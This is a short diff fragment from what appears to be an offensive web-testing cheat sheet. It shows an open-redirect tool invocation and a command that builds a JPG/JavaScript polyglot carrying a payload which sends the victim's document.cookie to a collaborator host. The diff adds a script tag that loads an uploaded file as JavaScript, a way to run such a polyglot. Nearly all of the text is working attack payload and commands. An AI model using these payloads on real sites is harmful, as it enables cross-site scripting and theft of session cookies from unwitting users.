@@ -199,3 +199,6 @@ crimson_redirectOR.py whitelisted.com afine.com 123.123.123.123 redirect_uri
 ```
 python3 pol_jpg_js_gif_gen.py jpg -H 250 -W 250 -p 'document.location.href="http://domain_collab?"+document.cookie;' -o a.jpg
 ```
+```js
+<script charset="ISO-8859-1" src="/upload/file"></script>
+```
